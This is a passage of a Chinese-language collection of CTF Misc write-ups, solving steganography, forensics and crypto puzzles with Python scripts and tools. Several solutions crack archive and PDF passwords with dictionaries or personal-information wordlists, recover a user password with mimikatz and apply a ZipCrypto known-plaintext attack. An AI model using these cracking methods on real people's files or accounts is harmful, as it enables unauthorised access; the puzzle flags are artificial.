    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(cipher_text), AES.block_size)
    
    # 将解密后的数据保存到输出文件
    with open(output_file, &#39;wb&#39;) as f:
        f.write(decrypted_data)

timestamp = 1732250675
key = NODecryptionForYou1(timestamp)
enc_file = f&#39;{timestamp}.locked&#39;  # 加密文件
output_file = f&#39;{timestamp}.decrypted&#39;  # 解密后的文件

NODecryptionForYou2(key, enc_file, output_file)

print(f&#34;File decrypted successfully! Output saved as {output_file}&#34;)
```

运行以上代码，发现解密后的文件是一个zip压缩包，因此改后缀位.zip并解压可以得到一个`重要数据.docx`

![](imgs/image-20241218133157811.png)

打开DOCX即可得到flag：`flag{851bd91f4a8168d2d719ab69eb1423f9}`

![](imgs/image-20241218133121093.png)

## 题目名称 莉可丽丝(迅岚安全杯)

题目附件给了一个压缩包，解压后可以得到一张`莉可丽丝 .jpg`

![](imgs/image-20241221163917350.png)

010打开发现末尾藏了一个7z压缩包

![](imgs/image-20241221163939567.png)

提取出来后尝试使用弱密码字典爆破，得到解压密码`1234567890`

&gt; Tips：7z的弱密码字典爆破可能会有点慢，使用`passware kit`爆破可能会稍微快一点

![](imgs/image-20241221163949601.png)

解压后得到一个类似于PPTX结构的文件夹，因此我们压缩为zip并改后缀为.pptx

![](imgs/image-20241221164016806.png)

打开PPTX文件，删除覆盖在上面的文字和图片，发现最下面有一行白色的文字，改个颜色即可得到flag：`flag{geigei_zhen_de_hao_li_hai}
`
![](imgs/image-20241221164132989.png)

## 题目名称 电音

附件给了一个wav和一个加密的压缩包

wav用au打开查看频谱图可以看到一个二维码

![](imgs/image-20241225235620648.png)

截个图然后用PPT拼一下可以得到下面这张二维码，扫码得到`qr1sc0ol&amp;`

![](imgs/image-20241225235752506.png)

因此猜测还有后半段的解压密码，仔细查看那个wav文件，尝试把前面二维码的内容删除

把剩下的内容`效果器-音量与压缩-增幅`，然后再播放，发现是DTMF电话音

直接用[GitHub - ribt/dtmf-decoder](https://github.com/ribt/dtmf-decoder) 这个项目识别一下可以得到：`3863334447777222666666555`


![](imgs/image-20241226000856436.png)

然后联想到手机键盘密码，根据下面这个对照表得到`dtmfiscool`

感谢烛影✌提供的对照表

![](imgs/image-20241226092225804.jpeg)

```
3 8 6 333 444 7777 222 666 666 555
d t m f    i    s   c   o   o   l
```

因此压缩包的解压密码为`qr1sc0ol&amp;dtmfiscool`，解压即可得到flag：`flag{b606eea7-16e4-4b41-9efc-ca000429480f}`

## 题目名称 Coffee_loving_cat(天权信安CTF)

整场比赛Misc的完整wp：[首届“天权信安&amp;catf1ag”网络安全联合公开赛-部分misc-CSDN博客](https://blog.csdn.net/weixin_52365980/article/details/128338404)

附件给了一个压缩包，里面一共有四个文件，其中三个文件是加密的

![](imgs/image-20241225205715776.png)

但是下面这张文件没有加密，猜测需要从下面这张图片中获取解压密码

![](imgs/image-20241225205550609.jpeg)

发现这张图片主要是讲咖啡价格的，因此密码与咖啡有关，上网搜索可以找到下面这篇文章

星巴克杯子上字母的含义：https://www.mopress.io/food/olejRNQWej

```
1. L - 一般拿铁（Latte）
2. VL - 香草拿铁（Vanilla Latte）
3. HL - 榛子拿铁（Hazelnut Latte）
4. FW - 馥芮白（Flat white）
5. CM - 焦糖玛奇朵（Caramel Macchiato）
6. M - 摩卡（Mocha）
7. C加横杠 - 卡布奇诺（Cappuccino）
8. A - 美式咖啡（Americano）
```

根据这个对应关系和上面那张图可以得到：`ALCMCMFW`

然后把上面咖啡的价格以此相加`6&#43;9&#43;12&#43;10&#43;14&#43;11 = 62`联想到base62编码

之前得到的内容base62编码一下可以得到解压密码`5bZuRXL0Mjf`

解压后可以得到两张图片，里面有两张二维码

![](imgs/image-20241225212423398.png)

![](imgs/image-20241225212429255.png)

扫码后可以得到如下内容

```
Megrez is yyds!!!

Megrez is my god!!!
```

然后我们看另一张图片，结合题目名称中的cat，猜测是Arnold猫脸变换

因为shuffle_times、a、b三个参数都未知，因此我们尝试爆破一下

最后发现正确的shuffle_times、a、b分别为 12、0、9

&gt; Tips：这里因为图片不是正方形，所以需要分别取模宽和高

```python
import cv2
import numpy as np

def arnold_decode(image, shuffle_times, a, b):
    decode_image = np.zeros(shape=image.shape)
    h, w = image.shape[0], image.shape[1]
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                new_x = ((a * b &#43; 1) * ori_x &#43; (-b) * ori_y) % h
                new_y = ((-a) * ori_x &#43; ori_y) % w
                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]
        image = np.copy(decode_image)
    return image

if __name__ == &#34;__main__&#34;:
    img = cv2.imread(&#34;fla@.bmp&#34;)
    decode_img = arnold_decode(img, 12, 0, 9)
    cv2.imwrite(&#39;flag.png&#39;,decode_img)
```

运行以上脚本后即可得到flag：`flag{512ed05a-629a-11ed-ae9d-ac1203fb3249}`

![](imgs/image-20241225215512617.png)

## 题目名称 简单的图片(XSCTF联合招新赛)

附件给了下面这张图片

![](imgs/image-20241225220056396.png)

zsteg扫一下，发现LSB隐写了数据

![](imgs/image-20241225220153184.png)

尝试用`zsteg -e b1,bgr,lsb,xy IM.png &gt; data.txt`导出可以得到如下数据

```
[&#39;xxfxc&#39;, &#39;xxfst&#39;, &#39;xxtfc&#39;, &#39;xxfxt&#39;, &#39;xxfft&#39;, &#39;xxttc&#39;, &#39;xxffs&#39;, &#39;xxsft&#39;, &#39;xxftc&#39;, &#39;xxtfx&#39;, &#39;xxtfc&#39;, &#39;xxfcf&#39;, &#39;xxfxs&#39;, &#39;xxtfx&#39;, &#39;xxctx&#39;, &#39;xxfcx&#39;, &#39;xxtfx&#39;, &#39;xxsff&#39;, &#39;xxfsf&#39;, &#39;xxtfc&#39;, &#39;xxfxt&#39;, &#39;xxcxs&#39;, &#39;xxtfx&#39;, &#39;xxfsf&#39;, &#39;xxtfc&#39;, &#39;xxftx&#39;, &#39;xxfts&#39;, &#39;xxfxs&#39;, &#39;xxfcf&#39;, &#39;xxsfc&#39;, &#39;xsxxx&#39;]
```

仔细观察上面的数据，发现都是x开头的，然后每个字符串的长度都是5，并且字符集就是`xsctf`这五个字符

因此猜测是五进制，结合最后一个字符`xsxxx`对应`01000(125)`刚刚好是`{`，更加确定是五进制了

因此我们写一个脚本转换一下即可得到flag：`flag{\y0u_are_An_1mag3_master/}`

```python
lst = [&#39;xxfxc&#39;, &#39;xxfst&#39;, &#39;xxtfc&#39;, &#39;xxfxt&#39;, &#39;xxfft&#39;, &#39;xxttc&#39;, &#39;xxffs&#39;, &#39;xxsft&#39;, &#39;xxftc&#39;, &#39;xxtfx&#39;, &#39;xxtfc&#39;, &#39;xxfcf&#39;, &#39;xxfxs&#39;, &#39;xxtfx&#39;, &#39;xxctx&#39;, &#39;xxfcx&#39;, &#39;xxtfx&#39;, &#39;xxsff&#39;, &#39;xxfsf&#39;, &#39;xxtfc&#39;, &#39;xxfxt&#39;, &#39;xxcxs&#39;, &#39;xxtfx&#39;, &#39;xxfsf&#39;, &#39;xxtfc&#39;, &#39;xxftx&#39;, &#39;xxfts&#39;, &#39;xxfxs&#39;, &#39;xxfcf&#39;, &#39;xxsfc&#39;, &#39;xsxxx&#39;]

trans = str.maketrans(&#34;xsctf&#34;,&#34;01234&#34;)

flag = &#34;&#34;
for item in lst:
    flag &#43;= chr(int(item.translate(trans),5))
    
print(flag)
# flag{\y0u_are_An_1mag3_master/}
```


## 题目名称 mos

附件给了一个zip压缩包，尝试解压发现报错

![](imgs/image-20241229105407188.png)

用010打开，发现是文件头损坏了，因此我们修复一下PK文件头`504B0304`

![](imgs/image-20241229105440827.png)

然后解压发现需要密码，因此我们尝试使用弱密码字典爆破，爆破得到解压密码：`1234`

![](imgs/image-20241229105601835.png)

然后解压得到一个TXT文件，vscode打开发现全是换行符和TAB

![](imgs/image-20241229105847149.png)

上面没有发现什么信息，然后尝试了Snow和WhiteSpace也没有发现什么，因此尝试用010打开

![](imgs/image-20241229110123007.png)

发现只有`0D0A`和`09`这两种字符，因此很容易就能联想到要转换为二进制

直接CyberChef转换一下即可得到flag：`DASCTF{dmF1Swofv__hpDYa52y6g4eGJEt_KX}`

![](imgs/image-20241229110612714.png)

## 题目名称 Misc-1

附件给了一张PNG图片，010打开发现有报错，拉到最后面发现图片末尾藏了一个PDF文件

![](imgs/image-20241229131712409.png)

手动把PDF文件提取出来，打开发现需要密码

![](imgs/image-20241229131730152.png)

直接使用`pdfcrack`弱密码字典爆破一下即可得到密码：`qazwsx123`，打开即可得到flag：`flag{Misc_iS_S0eAsy!}`

![](imgs/image-20241229131736993.png)

![](imgs/image-20241229131756212.png)

## 题目名称 654321

附件给了一张PNG图片，010打开发现报错，发现图片末尾藏了一个RAR压缩包

![](imgs/image-20241229151425356.png)

手动提取出来并解压，得到一个`hint.docx`，里面的内容如下

![](imgs/image-20241229151527679.png)

提示了`Image steganography`这个工具，然后结合图片名字`654321`，猜测这个就是解密的密码

因此使用`Image steganography`解密即可得到flag：`zjctf{060cdc53440dde37f2d48c33da37113b4d95a458}`

![](imgs/image-20241229151648420.png)

## 题目名称 真实的CTF(WgpSecTeam)




## 题目名称 丢失的关键基础设施固件

题面信息如下：
&gt; 丢失的关键基础设施固件
&gt; 
&gt; 尝试从内存镜像中找回丢失的固件，并从固件中找到关键信息


附件给了一个`memdump.raw`内存镜像，直接R-stdio打开先粗略的看一遍

发现在Develop用户的桌面上有个`secret.zip`和两个压缩和解压的exe

![](imgs/image-20241229110931697.png)

因此尝试用vol2把桌面上这几个文件提取出来（但是好像zip.exe是提取不出来的）

![](imgs/image-20241229111842695.png)

提取出来后发现需要解压密码

![](imgs/image-20241229112038934.png)

我们使用`mimikatz`插件可以爆破出`develop`用户的密码：`!Qaz@Wsx`，但是不是压缩包的解压密码

![](imgs/image-20241229112325533.png)

然后在`iehistory`中可以知道丢失的固件名称为`红绿灯固件.txt`

![](imgs/image-20241229120047938.png)

![](imgs/image-20241229120112436.png)

回头仔细看那个压缩包，发现是Store&#43;Zipcrypto，因此可以用PNG的文件头进行明文攻击

用bkcrack明文攻击后即可得到最后的flag


## 题目名称 QRSACode

题面信息如下

&gt; 描述：p = 13,q = 19,e = ?

解压附件给的压缩包，可以得到如下两张图片，其中`task.png`中隐约可以看到一张二维码

![](imgs/image-20250818213344866.png)

然后结合题面的信息，我们知道在RSA中`e`要和`phi`互质，其中`phi=(q-1)*(p-1)`

因此我们可以写个脚本得到`e`所有可能的取值范围

```python
import gmpy2

def cal_e():
    p = 13
    q = 19
    phi = (p - 1) * (q - 1)
    res = [e for e in range(2, 256) if gmpy2.gcd(e, phi) == 1]
    # print(len(res)) # 84
    # print(res)
    return res
```

得到`e`所有可能的取值如下，一共84种可能取值：

```
[5, 7, 11, 13, 17, 19, 23, 25, 29, 31, 35, 37, 41, 43, 47, 49, 53, 55, 59, 61, 65, 67, 71, 73, 77, 79, 83, 85, 89, 91, 95, 97, 101, 103, 107, 109, 113, 115, 119, 121, 125, 127, 131, 133, 137, 139, 143, 145, 149, 151, 155, 157, 161, 163, 167, 169, 173, 175, 179, 181, 185, 187, 191, 193, 197, 199, 203, 205, 209, 211, 215, 217, 221, 223, 227, 229, 233, 235, 239, 241, 245, 247, 251, 253]
```

然后我们尝试去读取`hint.png`中的像素点

```python
def func1():
    dic = {}
    img1 = Image.open(&#34;hint.png&#34;)
    width,height = img1.size # 50 50
    for y in range(height):
        for x in range(width):
            pixel = img1.getpixel((x,y))
            if pixel not in dic:
                dic[pixel] = 1
            else:
                dic[pixel] &#43;= 1
    # print(len(dic)) # 2496
    print(dic)
```

发现2500个像素点中有2496种像素，并且只有以下两种像素出现了2次，别的像素都是只出现一次

```
(133, 167, 215): 2
(31, 163, 119): 2
```

我们把所有像素打印出来可以发现，每个像素的RGB值都是取自我们之前得到的`e`的取值范围中

然后我们再去看`task.png`，发现图像时RGBA格式的，只不过A通道的值都是255

```python
def solve():
    dic = {}
    img1 = Image.open(&#34;task.png&#34;)
    width,height = img1.size # 50 50
    for y in range(height):
        for x in range(width):
            pixel = img1.getpixel((x,y))
            if pixel not in dic:
                dic[pixel] = 1
            else:
                dic[pixel] &#43;= 1
    # print(len(dic)) # 1112
    # print(dic)
```

发现一共有1112种不同的像素

并且背景接近白色的像素点的RGBA的值为`(246, 246, 246, 255)`，黑色像素点的RGBA值为`(0, 0, 0, 255)`

&gt; 后来在 `@Aura` 师傅的帮助下，发现了其实图片中的每个像素的每个RGB的值都是RSA加密中的参数

因为我们之前得到了，`hint.png`中每个像素的每个RGB值都在`e`的取值范围中

然后`hint.png`和`task.png`的长宽是一样的，也就是说像素的个数以及RGB值的个数也是一样的，所以是一一对应的

因此我们可以联想到，把每个像素的每个RGB值都做一次RSA解密，`hint.png`中的是`e`，`task.png`中的是密文`c`

最后把我们RSA解密得到的`m`转为RGB值塞回图像中即可复原出二维码，扫码即可得到最后的flag：`DASCTF{R54_W1th_Cv_1s_Fun}`

![](imgs/image-20250818213430714.png)

![](imgs/image-20250818213401070.png)

最终的解题脚本如下：

```python
from PIL import Image
import gmpy2
import numpy as np

p = 13
q = 19
n = p * q # 247
phi = (p-1)*(q-1) # 216

def get_e():
    e_list = []
    img1 = Image.open(&#34;hint.png&#34;)
    width,height = img1.size
    for y in range(height):
        for x in range(width):
            pixel = img1.getpixel((x,y))
            for item in pixel:
                e_list.append(item)
    print(len(e_list))
    return e_list

def func1(e_list):
    c_list = []
    m_list = []
    img1 = Image.open(&#34;task.png&#34;)
    width,height = img1.size # 50 50
    for y in range(height):
        for x in range(width):
            r,g,b,a = img1.getpixel((x,y))
            c_list.append(r)
            c_list.append(g)
            c_list.append(b)
    print(len(c_list))
    for idx,e in enumerate(e_list):
        c = c_list[idx]
        d = gmpy2.invert(e, phi)
        m = pow(c, d, n)
        m_list.append(m)
    print(len(m_list))
    pixel_array = np.array(m_list, dtype=np.uint8).reshape((height, width, 3))
    img2 = Image.fromarray(pixel_array, mode=&#34;RGB&#34;)
    img2.save(&#34;decrypted.png&#34;)
    print(&#34;[&#43;] 处理完成，已保存为 decrypted.png&#34;)
    
if __name__ == &#34;__main__&#34;:
    e_list = get_e()
    func1(e_list)
```

## 题目名称 to(2025天山固网)

题目附件给了一个pcapng流量包

翻看流量包，发现有一个`falg.rar`

![](imgs/image-20250817224525993.png)

尝试打开，发现需要密码，因此猜测我们还需要到流量包中寻找解压密码

我们先将所有http对象导出，然后依此查看

可以在hello.html中找到如下内容

![](imgs/image-20250817224708469.png)

一开始以为是密码字典，但是经过尝试发现并不是

在导入过程中发现了这些字符组成了一个42x42的矩阵（正方形-&gt;猜测是二维码）

然后发现最外围一圈全是小写字母，因此尝试把大小写字母转为0和1，再转为二维码可以得到下图

![](imgs/image-20250817225004671.png)

```python
from PIL import Image

def save_binary_to_png(data_str, out_file=&#34;output.png&#34;, scale=10):
    h = 42
    w = 42
    img = Image.new(&#34;L&#34;, (w, h))
    for y in range(h):
        for x in range(w):
            ch = data_str[y * w &#43; x]
            if ch == &#34;1&#34;:
                img.putpixel((x, y), 0)     # 黑色
            else:
                img.putpixel((x, y), 255)   # 白色
    if scale &gt; 1:
        img = img.resize((w*scale, h*scale), Image.NEAREST)

    img.save(out_file)
    print(f&#34;[&#43;] Saved: {out_file}&#34;)

def solve():
    flag = &#34;&#34;
    data = &#39;&#39;&#39;
    xwsoawzfknojzwejkrmsewynkoichlsgxiduinsklf
    yPZUIQGHEadEGfohHeISleDsLvqleMaryIMUPMEAIc
    aOzezoevMpeIZmUABHDDQNAFwhgqynYtbAntvgbhNq
    dReTZSEuOjxCVRNGDvfzDZQmTTDZPfQwwYkEIEToDu
    cFrJVUCvBndOJRMFXppxMSVmYQSINrLrzUyIKPBuMv
    vJfLLPIgUnhjaFaiDafXIZnWlspnBSwmbSqKNGEjJt
    lEfHPSMrKmpoZlolmYamKOJARccoxlMonFrNAXUuOs
    tTrknqbzUnuTZAnzYlQxAJKUXhEHbxkgxOdbzcvbPe
    fLKJSSGZVsiXyIoqKgBgPBuZhXuqZpEtsJDENSSUKh
    zkyintuqwjfHOYCSiFSCbfMvTjYBlhDfgzfwryxfxf
    mgorlmjgqwiYEKEOcHVGzcCdKfXTwiFyyxakvffvmb
    pypIOXBuYdmRHfKYkqfkJEWrcqdwCaGDTETtdTYLBc
    qaOYZtXKgnqLqTvbGWFfNABIULxdzJrNFWfjqglGLa
    kpifniZqGmtGcwkwTbInapWDUSndLmYCEaRwbIZQjf
    zcRsskImaaktyaAEQCYwEMgfsmqowSXguEcjFUYacy
    cuXfchFnhrmppjNPDIPrZMtrkjfjaGZblQmhPVIxbu
    wPZJICEiALOANFwaIEgsFIMMceQFWCNOMfJvzpjtYw
    dOGMXoZPwERhAronbdWtURHrKuvhzOrhqExMCncXTp
    uEadoMPxWdqiqKQQydQgHIcDQSxsisEQQtBArnfWaq
    yZdNMVOQiLEqkIIEsWNgNGWknoAXlrSzymkMEiloNo
    jpxBPJKXTKYWuIjvvDvNqzwPShhhFYRUQcSQlRQaOf
    acjTBNFPQFZMsZrjzMjZcbhIHnmmCGYNMvEHtKMvHj
    aJXVLJrWbxufHmcoDjPXitiddVvrxBjtgOwjvWPqwc
    tpUvbIGZJnyxhYyxwYlxMLtfMRfvgjjebtaKNmvzhq
    fBfXVdAcmHHLJIKJaEHkuyJBHlOCkhUOKiDtBDMXKf
    niUOLbjbYgtDYqDQadcIhqsmoiszAgTkhzRHTgrtfu
    jFqyrqOtlrlBxKfoqzOlPDigEKIVowuVNtwowQTzNe
    wDpqogPjgpiInPbeycJfLKnpYSQRffcQAgbiqVHaHx
    zKsSVYWXDOCyxpIAPQyAXClurmQIPVRaawZlXysWwh
    aVibdxPPcwlVJzpvslGfLWnshkROmZsNVDwiYVCyOz
    cPdMGJHtWYDqWhhcCknGusYXZJqmVXVKRPSAsqvpKt
    kdbjynqdekdZseNYrEqYLFePAJDYYwHinccQndztIh
    mfsqtjkdxcsDaaUJuGfFCPiUEYOBUsKpfggIjyvuJp
    tJKWKWSHHokapfecpGfuyisXziSDkZPxhOoHMukVnk
    rLfpalbeTxacxFRHRpHZftGjtMXTOKYsrckHBBCCPo
    sXcHKNJkOgxURfidXZthchdBoTJTqbFYRJVIZemdXm
    oTbCRVEoQyhZYSQCaVrsNLpEWlckAsoXVvOPuNDGsv
    yTfMQCVxBiyTvvNRMibBGFDDNltjJOChlNpjALBoos
    lKoUHLBdFveKvzFPBwvLTVQHDypjNOGxrJdaDIBdnh
    rSobpwjtYkmwwawtRrHrFPMgzfobhntphVbFcAJmvn
    nHHKBFFGMzywuXjwZDgtqnPQRWJPQBVlhqPdJFTJcc
    bpvrwdbuhrgrgackekaotpwbeclbnlamzzuhrqmwjg
    &#39;&#39;&#39;
    for i in range(len(data)):
        if data[i] &gt;= &#39;a&#39; and data[i] &lt;= &#39;z&#39;:
            flag &#43;= &#39;0&#39;
        elif data[i] &gt;= &#39;A&#39; and data[i] &lt;= &#39;Z&#39;:
            flag &#43;= &#39;1&#39;
    # print(flag)
    save_binary_to_png(flag)


if __name__ == &#34;__main__&#34;:
    solve()
```

虽然这个二维码有点问题，但是用微信扫码可以得到：`ssdsahjkhsdfhhkjjhksdfjhds`

但是这个也不是压缩包的解压密码，因此我们回头继续看流量包

发现还传了一张jpg图片，并且jpg图片中有提示：`I&#39;ve heard of Dvorak`

![](imgs/image-20250817225336021.png)

Dvorak是一种键盘布局，详细内容可以看我博客里的 [Misc Guide](https://goodlunatic.github.io/posts/1ad9200/)

因此结合之前得到的内容，猜测我们需要把扫码得到的字符串转换到Dvorak上

或者是把扫码得到的字符串从Dvorak转换过来，我这里就直接写个脚本转了

```python
qwerty_lower = r&#34;&#34;&#34;qwertyuiop[]\asdfghjkl;&#39;zxcvbnm,./&#34;&#34;&#34;
dvorak_lower = r&#34;&#34;&#34;&#39;,.pyfgcrl/=\aoeuidhtns-;qjkxbmwvz&#34;&#34;&#34;

qwerty_upper = r&#34;&#34;&#34;QWERTYUIOP[]\ASDFGHJKL;&#39;ZXCVBNM,./&#34;&#34;&#34;
dvorak_upper = r&#34;&#34;&#34;&#34;&lt;&gt;PYFGCRL?&#43;|AOEUIDHTNS_:QJKXBMWVZ&#34;&#34;&#34;

# 构建映射字典
d2q = str.maketrans(dvorak_lower &#43; dvorak_upper,
                    qwerty_lower &#43; qwerty_upper)

q2d = str.maketrans(qwerty_lower &#43; qwerty_upper,
                    dvorak_lower &#43; dvorak_upper)

def dvorak_to_qwerty(text: str) -&gt; str:
    return text.translate(d2q)

def qwerty_to_dvorak(text: str) -&gt; str:
    return text.translate(q2d)

if __name__ == &#34;__main__&#34;:
    text = &#34;ssdsahjkhsdfhhkjjhksdfjhds&#34;
    print(dvorak_to_qwerty(text))
    print(qwerty_to_dvorak(text))
    # ;;h;ajcvj;hyjjvccjv;hycjh;
    # ooeoadhtdoeuddthhdtoeuhdeo
```

其中 `ooeoadhtdoeuddthhdtoeuhdeo` 就是rar的解压密码

解压后即可得到最后的flag：`DASCTF{jhughudshhjg_qiwjains_jsmka}`

## 题目名称 数字雨(2025天山固网)

题目附件给了下面这张PNG（图片比较大，有40多兆，因为宽高是6000x4000）

![](imgs/image-20250817223412543.png)

我们用PS打开查看，发现每一列都有长度为80的同一绿色像素(18, 255, 2)

![](imgs/image-20250817223617268.png)

如果做过b01lers的image_adjustments这道题的师傅肯定一眼就知道图片的意图是啥了

就是要我们为每列像素加一个偏移量，让每一列中的这80个绿色像素都对齐

具体原理和步骤可以参考的我的另一篇博客：[2020 b01lers Misc image_adjustments 赛题详解](https://goodlunatic.github.io/posts/00658ee/)

写个脚本对齐后，就可以得到下图

![](imgs/image-20250817223934477.png)

我们再次用PS打开查看

![](imgs/image-20250817224022930.png)

发现这次是每一行有80个同一绿色像素(18, 255, 2)了，因此我们和上面一样

尝试计算偏移量并对齐每一行的绿色像素即可得到最后的flag: `DASCTF{herE_c0mes_thE_D1g1taL_ra1n}`

![](imgs/image-20250817224156497.png)

最后附上完整的解题脚本：

```python
import numpy as np
from PIL import Image

def process_image_cols(input_path, output_path):
    # 打开图像并转换为NumPy数组
    img = Image.open(input_path)
    img_array = np.array(img)
    h, w = img_array.shape[:2]

    green_pixel = np.array([18, 255, 2], dtype=img_array.dtype)
    
    for x in range(w):
        # 获取当前列的所有像素
        column = img_array[:, x, :].copy()
        
        # 尝试所有可能的偏移量
        for i in range(h):
            # 应用偏移
            shifted_column = np.roll(column, i, axis=0)
            img_array[:, x, :] = shifted_column
            # 检查前80行是否都是绿色像素
            if np.all(img_array[:80, x, :] == green_pixel):
                print(f&#34;[&#43;] {x} 列偏移量调整完毕: {i}&#34;)
                break
    
    # 将NumPy数组转换回PIL图像并保存
    result_img = Image.fromarray(img_array)
    result_img.save(output_path)
    result_img.show()

def process_image_rows(input_path, output_path):
    # 打开图像并转换为NumPy数组
    img = Image.open(input_path)
    img_array = np.array(img)
    h, w = img_array.shape[:2]
    
    green_pixel = np.array([18, 255, 2], dtype=img_array.dtype)
    
    for y in range(h):
        current_row = img_array[y, :, :].copy()
        
        # 尝试所有可能的水平偏移量
        for shift in range(w):
            shifted_row = np.roll(current_row, shift, axis=0)
            
            # 检查前80个像素是否全部是绿色
            if np.all(shifted_row[:80] == green_pixel):
                print(f&#34;[&#43;] {y} 行偏移量调整完毕: {shift}&#34;)
                img_array[y, :, :] = shifted_row
                break
    
    result_img = Image.fromarray(img_array)
    result_img.save(output_path)
    result_img.show()

if __name__ == &#34;__main__&#34;:
    process_image_cols(&#39;img.png&#39;, &#39;col_solved.png&#39;)
    process_image_rows(&#39;col_solved.png&#39;,&#39;flag.png&#39;)
```

## 题目名称 capture(2025年浙江省信息通信业职业技能竟赛-数据安全管理员竞赛决赛)

题目附件给了一个很小的pcapng流量包（27kb）

![](imgs/image-20250818225242004.png)

打开翻看发现是100个UDP数据包，然后看样子是传了json一样的数据

因此我们可以直接 `strings capture.pcapng &gt; 1.txt` 把里面的内容导出来

导出来后，手动删去干扰的字符，可以得到如下内容：

![](imgs/image-20250818225541825.png)

提示了是DES-xxx加密算法，并且用了四个不同的密钥

仔细观察可以发现，每个密文的前面部分内容都是一样的

因此猜测明文的开头是一样的，并且key_id相同的密文，用的密钥也是一样的

之前就听说过DES是由于安全性而被AES所替代了，并且在网上搜索过程中发现了下面这篇文章：

https://noob-atbash.github.io/CTF-writeups/cyberwar/crypto/chal-5.html

尝试用文中的四个弱密钥去解密，发现有一半的数据可以正常解出来

并且可以得到解密后明文的开头是 `FLAG_HEADER:DATA`

然后仔细看了[这篇帖子](https://crypto.stackexchange.com/questions/7938/may-the-problem-with-des-using-ofb-mode-be-generalized-for-all-feistel-ciphers)后，尝试用  `\x00 \xFF \xF0 \x0F \x1E \xE1` 去生成密钥爆破

```python
from Crypto.Cipher import DES
from itertools import product
from base64 import b64decode

BYTES = [b&#39;\x1E&#39;, b&#39;\xE1&#39;, b&#39;\xF0&#39;, b&#39;\x0F&#39;, b&#39;\x00&#39;, b&#39;\xFF&#39;]

def generate_keys():
    byte_combinations = product(BYTES, repeat=8)
    for combo in byte_combinations:
        yield b&#39;&#39;.join(combo)

def brute_force_decrypt(encrypted_data):
    for key in generate_keys():
        cipher = DES.new(key, DES.MODE_ECB)
        try:
            decrypted = cipher.decrypt(encrypted_data)
            if decrypted.startswith(b&#34;FLAG&#34;):
                print(f&#34;Found valid key: {key}&#34;)
                print(f&#34;Decrypted data: {decrypted}&#34;)
                return key
        except:
            continue
    return None

encrypted_data = b64decode(&#34;ftNbIBh&#43;yU8rzOhvbAplhB1hoQkblsKa&#43;uGaNnTudD2LGw0&#43;5fOHXycXZDujJFWwHZjIg5bfDpKFsqI18Ts7ZGG8dpqWAzar&#34;)
found_key = brute_force_decrypt(encrypted_data)
if not found_key:
    print(&#34;No valid key found.&#34;)
```

发现一会就能爆破出密钥，用得到的密钥去解密即可得到最后的flag：`flag{9adee0d8d9db40fc99e8366bf2bd474d}`

![](imgs/image-20250818230628193.png)

```python
from Crypto.Cipher import DES
from base64 import *

key_list = [b&#34;\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F&#34;,b&#34;\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0&#34;,b&#34;\xff\x00\xff\x00\xff\x00\xff\x00&#34;,b&#34;\x00\xff\x00\xff\x00\xff\x00\xff&#34;]

def solve():
    with open(&#39;2.txt&#39;,&#39;r&#39;) as f:
        data = f.read().split()
    for item in data:
        ciphertext = b64decode(item)
        for KEY in key_list:
            a = DES.new(KEY, DES.MODE_ECB)
            plaintext = a.decrypt(ciphertext)
            # print(plaintext)
            if b&#34;FLAG&#34; in plaintext:
                print(plaintext)
                # print(f&#34;[&#43;] 用密钥 {KEY} 解密成功:\n{plaintext}&#34;)   

if __name__ == &#34;__main__&#34;:
    solve()
```

## 题目名称 带密码的zip(中国铁塔内部选拔赛)

![](imgs/image-20250821101548417.png)

题面信息如下：

&gt; 小明把qq密码存在了一个txt文档里，并且将其进行了zip压缩；
&gt; 
&gt; 不过小明忘记了解压密码，只记得密码是自己个人信息的组合
&gt; 
&gt; 你能帮小明找回密码吗？
&gt; 
&gt; 已知：
&gt; 
&gt; 姓名 xiaoming
&gt; 
&gt; 生日 19901002
&gt; 
&gt; 邮箱 xm1990@163.com
&gt; 
&gt; 手机 13351231732

![](imgs/image-20250820233514709.png)

根据题面信息，直接写个脚本生成字典，然后爆破压缩包密码即可

```python
import itertools


elements = [&#39;xiaoming&#39;, &#39;19901002&#39;, &#39;xm1990@163.com&#39;, &#39;13351231732&#39;]
all_passwords = []

for r in range(1, len(elements)&#43;1):
    # 选择大小为r的子集
    for subset in itertools.combinations(elements, r):
        # 对每个子集生成所有排列
        for perm in itertools.permutations(subset):
            # 将排列连接成一个字符串
            password = &#39;&#39;.join(perm)
            all_passwords.append(password)

print(f&#34;[&#43;] 总共生成了 {len(all_passwords)} 种可能的密码&#34;)

with open(&#39;possible_passwords.txt&#39;, &#39;w&#39;) as f:
    for p in all_passwords:
        f.write(p &#43; &#39;\n&#39;)
```

![](imgs/image-20250821101430940.png)

输入密码解压后即可得到最后的flag：`nsfocus{xiaoming13351231732}`

## 题目名称 安全杂项1(交通运输行业大赛)

解压附件压缩包，得到一个wav音频和一个加密的压缩包

![](imgs/image-20250821104833581.png)

用audacity打开音频查看频谱图，调一下频率上下限和灰度显示

可以得到压缩包解压密码的正则

![](imgs/image-20250821105003952.png)

![](imgs/image-20250821105009023.png)

然后掩码爆破即可得到压缩包的解压密码：`Kaelin0808`

![](imgs/image-20250821105026931.png)

用得到的密码解压后，msg.txt中的内容是一串emoji

```
👝👣👘👞👲👛👜🐰🐩👘👛👜🐪🐤🐫🐬👚🐭🐤🐮🐩👙🐯🐤🐩👝👝👛🐤👝🐭👚👚👙🐨👚🐧🐪👛👛🐪👴
```

直接base100解密即可得到最后的flag: `flag{de92ade3-45c6-72b8-2ffd-f6ccb1c03dd3}`

![](imgs/image-20250821105123189.png)

## 题目名称 file.png(某内部赛)

解压附件压缩包，得到一张file.png，直接拿zsteg扫一下

![](imgs/image-20250823102547525.png)

发现LSB中隐写了一张PNG图片，尝试用`zsteg -e b3,bgr,lsb,xy file.png &gt; out.png`命令导出

可以得到下面这张图片

![](imgs/image-20250823102655772.png)

010打开，发现末尾藏了一个压缩包

![](imgs/image-20250823102741443.png)

提取出来解压或者直接在010中提取，即可得到最后的flag：`flag{Least_Significant_Bit_Steganography}`

## 题目名称 easy_crypto

解压附件压缩包，可以得到一个key.txt还有一个加密的flag.rar

key.txt中的内容如下：

&gt; 1091091153210977773210977109457732774646324677831153277464546324611511545838377321098377

